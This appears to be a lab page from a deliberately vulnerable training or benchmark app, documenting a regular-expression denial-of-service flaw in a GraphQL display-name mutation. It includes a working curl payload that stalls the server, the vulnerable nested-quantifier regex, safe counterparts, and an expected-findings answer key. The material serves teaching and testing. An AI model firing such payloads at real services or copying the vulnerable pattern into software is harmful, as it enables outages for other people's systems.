# `RE` — regular expression denial of service

One weakness of the legacy display-name change in `accounts`. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).

## RE-001 — the display-name pattern backtracks

### RE-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `updateDisplayName(name: String!)` |
| Sink | `/^([a-zA-Z0-9_ ]+)*$/`, a group with a nested quantifier over one character class, in `apps/accounts/src/legacy/display-name.resolver.ts` |
| Flow | twenty-nine `A`s and a `!` → the almost-match forces exponential backtracking → the event loop is held for seconds |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`updateProfile`: one linear pattern and a length cap), `apps/accounts/src/profile/profile.controller.ts` (`PUT /internal/profile`: an anchored character allowlist) |
| Tests | `apps/accounts/test/scenarios/proto-re-res.int-spec.ts` |
| Expected finding | Yes, CWE-1333, SAST |

### RE-001 — student guide

`([a-zA-Z0-9_ ]+)*` can split a run of characters into groups in exponentially many ways. When the tail of the input cannot match, the engine tries them all before giving up: one request costs seconds of CPU, and a handful of them in parallel cost the whole event loop.

### RE-001 — exploit lab

```console
$ time curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    --data-raw '{"query":"mutation { updateDisplayName(name: \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\") { id } }"}'
{"errors":[{"message":"A display name is letters, digits, underscores or spaces",
  "extensions":{"code":"BAD_USER_INPUT"}}]}
curl …  0.00s user 0.00s system 0% cpu 1.983 total
```

Two seconds of wall time for a refusal (the first requests after a start pay the engine's warm-up and run longer; twenty-eight `A`s answer in well under a second, thirty in minutes). The same name through the counterparts:

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    --data-raw '{"query":"mutation { updateProfile(input: {displayName: \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\"}) { id } }"}'
{"errors":[… "extensions":{"code":"BAD_USER_INPUT"}}]}   # 3ms
```

`PUT /internal/profile` with the same `displayName` answers its 400 just as fast: one anchored character class, no outer quantifier.

### RE-001 — vulnerable and protected

| | Why |
| --- | --- |
| `updateDisplayName` (vulnerable) | The nested quantifier turns an almost-match into exponential work, on this input |
| `updateProfile` (protected) | One anchored character class and a length cap: the same name is refused in one pass |
| `PUT /internal/profile` (protected) | The DTO's allowlist is a single anchored class, no outer quantifier |

### RE-001 — tests

`apps/accounts/test/scenarios/proto-re-res.int-spec.ts`, `RE-001`: the vulnerable mutation takes seconds for the name (asserted ≥ 1s); both counterparts answer the same refusal in milliseconds.
